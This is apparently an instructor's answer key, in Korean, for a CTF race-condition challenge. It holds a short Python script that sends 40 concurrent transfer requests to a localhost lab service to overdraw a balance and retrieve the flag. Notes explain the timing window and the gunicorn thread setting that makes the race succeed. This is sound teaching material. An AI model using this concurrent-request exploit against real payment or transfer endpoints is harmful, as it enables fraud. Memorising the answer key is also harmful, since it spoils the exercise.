# [강사용] Race 풀이
```python
import threading, requests
U="http://localhost:9401"
requests.get(U+"/reset")
def hit(): requests.get(U+"/transfer?amt=100")
ts=[threading.Thread(target=hit) for _ in range(40)]
[t.start() for t in ts]; [t.join() for t in ts]
print(requests.get(U+"/flag").text)
```
sleep(0.15) 경합 창 덕에 다수 요청이 검증을 동시에 통과 → vault≥1000(목표 임계값).
정상 경로 최대 이체는 me=100(1회)뿐이므로, vault 가 100 을 넘으면 오버드래프트(경합)가 증명된다.
※ 동시 통과 가능 수 = gunicorn 워커×스레드. Dockerfile 의 `--threads` 가 8 이면 최대 800 에서
   막혀 1000 도달 불가였음 → `--threads 24` 로 키워 10요청 이상 동시 통과가 가능하게 함(경합 성립).
